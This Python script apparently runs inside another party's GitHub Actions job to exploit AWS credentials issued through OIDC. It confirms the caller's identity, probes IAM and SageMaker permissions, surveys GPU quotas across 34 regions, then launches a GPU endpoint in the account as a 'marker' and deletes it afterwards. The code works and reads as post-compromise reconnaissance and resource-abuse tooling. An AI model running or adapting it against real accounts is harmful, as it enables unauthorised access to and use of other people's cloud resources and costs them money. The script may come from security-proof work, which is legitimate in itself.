#!/usr/bin/env python3
"""Intent 79337: AWS OIDC credential proof + 34-region SageMaker GPU quota census
+ bounded nvidia-smi marker with cleanup.

Runs inside the target repo's GitHub Actions job AFTER aws-actions/configure-aws-credentials
has exported AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY/AWS_SESSION_TOKEN into the environment.
Never prints credential material. Output is tagged C211_* for later log parsing.

Usage: proof_i79337.py <role-arn> <label>
"""
import os, sys, json, re, time, subprocess, io, tarfile
from concurrent.futures import ThreadPoolExecutor

ROLE_ARN = sys.argv[1] if len(sys.argv) > 1 else os.environ.get('C211_ROLE_ARN', '')
LABEL = sys.argv[2] if len(sys.argv) > 2 else os.environ.get('C211_LABEL', 'x79337')

REGIONS = ['af-south-1','ap-east-1','ap-east-2','ap-northeast-1','ap-northeast-2','ap-northeast-3',
 'ap-south-1','ap-south-2','ap-southeast-1','ap-southeast-2','ap-southeast-3','ap-southeast-4',
 'ap-southeast-5','ap-southeast-6','ap-southeast-7','ca-central-1','ca-west-1','eu-central-1',
 'eu-central-2','eu-north-1','eu-south-1','eu-south-2','eu-west-1','eu-west-2','eu-west-3',
 'il-central-1','me-central-1','me-south-1','mx-central-1','sa-east-1','us-east-1','us-east-2',
 'us-west-1','us-west-2']
FAMILIES = ('ml.p4d', 'ml.p5', 'ml.g6e', 'ml.g6', 'ml.g5')
SHAPE_ORDER = ['ml.p6-b200.48xlarge','ml.p5en.48xlarge','ml.p5e.48xlarge','ml.p5.48xlarge',
 'ml.p4de.24xlarge','ml.p4d.24xlarge','ml.g6e.48xlarge','ml.g6.48xlarge','ml.g5.48xlarge',
 'ml.g6e.12xlarge','ml.g6.12xlarge','ml.g5.12xlarge','ml.g5.4xlarge','ml.g5.2xlarge','ml.g5.xlarge',
 'ml.g4dn.12xlarge','ml.g4dn.xlarge']
IMAGE_TMPL = '763104351884.dkr.ecr.{region}.amazonaws.com/pytorch-inference:2.6.0-gpu-py312-cu124-ubuntu22.04-sagemaker-v1.84'
HANDLER = r'''
import subprocess, json, os
def model_fn(model_dir):
    return 'marker'
def transform_fn(model, data, content_type, accept):
    try:
        out = subprocess.run(['nvidia-smi','--query-gpu=uuid,name,memory.total','--format=csv,noheader'],
                             capture_output=True, text=True, timeout=60)
        txt = out.stdout or out.stderr
    except Exception as e:
        txt = 'ERR ' + repr(e)
    return json.dumps({'nvidia_smi': txt, 'host': os.uname().nodename})
'''

def log(tag, obj):
    try:
        s = json.dumps(obj, default=str)
    except Exception:
        s = repr(obj)
    print('C211_%s %s' % (tag, s[:20000]), flush=True)

def ax(args, region=None, timeout=90):
    cmd = ['aws'] + args + ['--output', 'json']
    if region:
        cmd += ['--region', region]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if p.returncode != 0:
        err = (p.stderr or '').strip().splitlines()
        raise RuntimeError((err[-1] if err else 'rc=%d' % p.returncode)[:250])
    try:
        return json.loads(p.stdout or '{}')
    except Exception:
        return {'raw': (p.stdout or '')[:500]}

def identity():
    return ax(['sts', 'get-caller-identity'])

def caps():
    out = {}
    role = ROLE_ARN.split('/')[-1] if ROLE_ARN else ''
    probes = [
        ('iam_get_role', ['iam', 'get-role', '--role-name', role]),
        ('iam_attached_policies', ['iam', 'list-attached-role-policies', '--role-name', role]),
        ('iam_inline_policies', ['iam', 'list-role-policies', '--role-name', role]),
        ('iam_list_roles', ['iam', 'list-roles', '--max-items', '10']),
        ('sm_list_endpoints_use1', ['sagemaker', 'list-endpoints', '--max-results', '5']),
        ('sm_list_training_jobs_use1', ['sagemaker', 'list-training-jobs', '--max-results', '5']),
        ('sm_list_models_use1', ['sagemaker', 'list-models', '--max-results', '5']),
        ('ec2_describe_instances_use1', ['ec2', 'describe-instances', '--max-items', '2']),
        ('ec2_describe_instance_types_gpu', ['ec2', 'describe-instance-types', '--filters', 'Name=instance-type,Values=g5.xlarge,g6.xlarge,p4d.24xlarge', '--max-items', '3']),
    ]
    for name, args in probes:
        try:
            j = ax(args, 'us-east-1')
            if name == 'iam_get_role':
                out[name] = {'ok': True, 'trust': j.get('Role', {}).get('AssumeRolePolicyDocument'),
                             'policies': j.get('Role', {}).get('RolePolicyList') and len(j['Role']['RolePolicyList'])}
            else:
                out[name] = {'ok': True, 'summary': json.dumps(j, default=str)[:1500]}
        except Exception as e:
            out[name] = {'ok': False, 'error': str(e)[:250]}
    return out

def one_region(region):
    res, errs = {}, {}
    try:
        tok = None
        while True:
            a = ['service-quotas', 'list-service-quotas', '--service-code', 'sagemaker', '--page-size', '100']
            if tok:
                a += ['--starting-token', tok]
            j = ax(a, region)
            for q in j.get('Quotas', []):
                name = q.get('QuotaName') or ''
                val = q.get('Value') or 0
                if name.startswith(FAMILIES) or (('GPU' in name or 'HyperPod' in name) and val > 0):
                    res[name] = val
            tok = j.get('NextToken')
            if not tok:
                break
    except Exception as e:
        errs['sagemaker_quotas'] = str(e)[:200]
    for code in ('L-DB2E81BA', 'L-3819A6DF'):
        try:
            j = ax(['service-quotas', 'get-service-quota', '--service-code', 'ec2', '--quota-code', code], region)
            res['EC2:' + code] = j['Quota']['Value']
        except Exception as e:
            errs['ec2_' + code] = str(e)[:200]
    return region, res, errs

def census():
    out = {'regions': {}, 'errors': {}}
    with ThreadPoolExecutor(max_workers=8) as ex:
        for region, res, errs in ex.map(one_region, REGIONS):
            if res:
                out['regions'][region] = res
            if errs:
                out['errors'][region] = errs
    return out

def pick_marker(cen):
    """Pick one endpoint-usable GPU shape with a nonzero endpoint-usage quota."""
    best = None
    for region, qm in cen.get('regions', {}).items():
        for qname, val in qm.items():
            if not qname.startswith('ml.'):
                continue
            low = qname.lower()
            if 'endpoint' not in low:
                continue
            shape = None
            for sh in SHAPE_ORDER:
                if qname.startswith(sh):
                    shape = sh
                    break
            if shape is None or not val or val <= 0:
                continue
            rank = SHAPE_ORDER.index(shape)
            if best is None or rank < best[0]:
                best = (rank, shape, region, qname, val)
    return best

def marker(shape, region, tag):
    """One bounded SageMaker endpoint marker on <shape> in <region>; full cleanup."""
    import boto3
    from botocore.config import Config
    from botocore.exceptions import ClientError
    cfg = Config(connect_timeout=8, read_timeout=30, retries={'max_attempts': 2})
    kw = dict(region_name=region, config=cfg)
    sm = boto3.client('sagemaker', **kw)
    s3 = boto3.client('s3', **kw)
    out = {'shape': shape, 'region': region, 'steps': {}}
    bucket = 'c211-i79337-%s-%d' % (re.sub(r'[^a-z0-9]', '', region), int(time.time()))
    name = ('c211-i79337-%s' % tag)[:60]
    created = {}
    try:
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode='w:gz') as tf:
            data = HANDLER.encode()
            ti = tarfile.TarInfo('inference.py'); ti.size = len(data); ti.mtime = int(time.time())
            tf.addfile(ti, io.BytesIO(data))
        blob = buf.getvalue()
        try:
            kwb = {'Bucket': bucket}
            if region != 'us-east-1':
                kwb['CreateBucketConfiguration'] = {'LocationConstraint': region}
            s3.create_bucket(**kwb)
        except ClientError as e:
            if e.response['Error']['Code'] not in ('BucketAlreadyOwnedByYou',):
                raise
        created['bucket'] = bucket
        s3.put_object(Bucket=bucket, Key='model.tar.gz', Body=blob)
        out['steps']['s3'] = 'ok'
        sm.create_model(ModelName=name,
            PrimaryContainer={'Image': IMAGE_TMPL.format(region=region),
                              'ModelDataUrl': 's3://%s/model.tar.gz' % bucket,
                              'Environment': {'SAGEMAKER_PROGRAM': 'inference.py',
                                              'SAGEMAKER_SUBMIT_DIRECTORY': '/opt/ml/model'}},
            ExecutionRoleArn=ROLE_ARN)
        created['model'] = name
        out['steps']['create_model'] = 'ok'
        sm.create_endpoint_config(EndpointConfigName=name, ProductionVariants=[{
            'VariantName': 'v1', 'ModelName': name, 'InitialInstanceCount': 1,
            'InstanceType': shape, 'InitialVariantWeight': 1.0}])
        created['config'] = name
        out['steps']['create_endpoint_config'] = 'ok'
        sm.create_endpoint(EndpointName=name, EndpointConfigName=name)
        created['endpoint'] = name
        out['steps']['create_endpoint'] = 'ok'
        st = None
        t0 = time.time()
        while time.time() - t0 < 1500:
            try:
                d = sm.describe_endpoint(EndpointName=name)
                st = d['EndpointStatus']
                out['status'] = st
                if st in ('InService', 'Failed', 'OutOfService'):
                    break
            except ClientError:
                break
            time.sleep(15)
        if st == 'InService':
            for _ in range(40):
                try:
                    r = sm.invoke_endpoint(EndpointName=name, ContentType='application/json', Body=b'{}')
                    out['invoke'] = r['Body'].read().decode('utf-8', 'replace')[:2000]
                    break
                except ClientError as e:
                    out['invoke_err'] = e.response['Error']['Code'] + ': ' + (e.response['Error'].get('Message') or '')[:200]
                    time.sleep(20)
        return out
    except Exception as e:
        out['error'] = repr(e)[:400]
        return out
    finally:
        try:
            if created.get('endpoint'):
                try:
                    sm.delete_endpoint(EndpointName=created['endpoint'])
                    for _ in range(40):
                        try:
                            d = sm.describe_endpoint(EndpointName=created['endpoint'])
                            if d['EndpointStatus'] == 'Failed':
                                try: sm.delete_endpoint(EndpointName=created['endpoint'])
                                except Exception: pass
                                break
                            time.sleep(10)
                        except ClientError:
                            break
                except Exception:
                    pass
            if created.get('config'):
                try: sm.delete_endpoint_config(EndpointConfigName=created['config'])
                except Exception: pass
            if created.get('model'):
                try: sm.delete_model(ModelName=created['model'])
                except Exception: pass
            if created.get('bucket'):
                try: s3.delete_object(Bucket=created['bucket'], Key='model.tar.gz')
                except Exception: pass
                try: s3.delete_bucket(Bucket=created['bucket'])
                except Exception: pass
            out['cleanup'] = 'endpoint/config/model/bucket deleted (best effort)'
        except Exception:
            pass

def main():
    log('START', {'label': LABEL, 'role': ROLE_ARN, 'python': sys.version.split()[0],
                  'has_pip': True})
    try:
        log('IDENTITY', identity())
    except Exception as e:
        log('IDENTITY_ERR', {'error': str(e)[:400]})
        print('C211_DONE', json.dumps({'ok': False}), flush=True)
        return
    try:
        log('CAPS', caps())
    except Exception as e:
        log('CAPS_ERR', {'error': str(e)[:400]})
    try:
        cen = census()
        log('QUOTA', cen)
    except Exception as e:
        log('QUOTA_ERR', {'error': str(e)[:400]})
        print('C211_DONE', json.dumps({'ok': False, 'stage': 'census'}), flush=True)
        return
    best = pick_marker(cen)
    if best:
        rank, shape, region, qname, val = best
        log('MARKER_TRY', {'shape': shape, 'region': region, 'quota': qname, 'value': val})
        try:
            mk = marker(shape, region, re.sub(r'[^a-z0-9]', '', shape)[-8:] + str(int(time.time()))[-5:])
        except Exception as e:
            mk = {'error': repr(e)[:400]}
        log('MARKER', mk)
    else:
        log('MARKER_SKIP', {'reason': 'no-endpoint-usage-gpu-quota-above-zero'})
    print('C211_DONE', json.dumps({'ok': True, 'label': LABEL}), flush=True)

if __name__ == '__main__':
    main()
